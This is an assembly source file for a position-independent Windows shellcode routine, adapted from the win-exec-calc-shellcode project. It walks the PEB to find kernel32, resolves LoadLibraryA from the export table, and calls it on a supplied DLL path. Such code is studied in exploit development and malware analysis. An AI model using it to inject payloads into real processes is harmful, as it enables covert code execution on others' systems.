; Copyright (c) 2009-2014, Berend-Jan "SkyLined" Wever <berendjanwever@gmail.com>
; and Peter Ferrie <peter.ferrie@gmail.com>
; Project homepage: http://code.google.com/p/win-exec-calc-shellcode/
; All rights reserved. See COPYRIGHT.txt for details.

; Modified by Odzhan to execute command lines
; Uses fastcall convention on x64 and stdcall on x86

%ifndef BIN
    global $@LoadLibraryPIC@4
    global LoadLibraryPIC
%endif
    
; for 64-bit upon entry, we assume stack is already
; aligned by 16 bytes. we save 4 registers, which
; is 32-bytes on 64-bit. we then need to allocate
; 32-bytes for homespace that WinExec might use.
; so 40 bytes is subtracted from stack pointer
; when call is made, stack will be aligned by 16 again
LoadLibraryPIC:
$@LoadLibraryPIC@4:
    bits 32
    push   ebx
    push   esi
    push   edi
    push   ebp
    sub    esp, 28h
    
    xor    eax, eax
    inc    eax
    xchg   eax, edx
    jz     x64
    
    mov    ecx, [esp+60]  ; 32-bit using stdcall
    push   ecx
    
    mov    esi, [fs:edx+2fh]
    mov    esi, [esi+0ch]
    mov    esi, [esi+0ch]
    lodsd
    mov    esi, [eax]
    mov    edi, [esi+18h]
    mov    dl, 50h
    jmp    lqe
    bits 64
x64:
    mov    dl, 60h
    mov    rsi, [gs:rdx]
    mov    rsi, [rsi+18h]
    mov    rsi, [rsi+10h]
    lodsq
    mov    rsi, [rax]
    mov    rdi, [rsi+30h]
lqe:
    add    edx, [rdi+3ch]
    mov    ebx, [rdi+rdx+28h]
    mov    esi, [rdi+rbx+20h]
    add    rsi, rdi
    mov    edx, [rdi+rbx+24h]
fwe:
    movzx  ebp, word [rdi+rdx]
    lea    rdx, [rdx+2]
    lodsd
    cmp    dword [rdi+rax], 'Load'
    jne    fwe
    cmp    byte [rdi+rax+0bh], 'A'
    jne    fwe
    
    mov    esi, [rdi+rbx+1ch]
    add    rsi, rdi
    
    mov    esi, [rsi+4*rbp]
    add    rdi, rsi
    call   rdi
    
    add    rsp, 28h
    pop    rbp
    pop    rdi
    pop    rsi
    pop    rbx
    ret

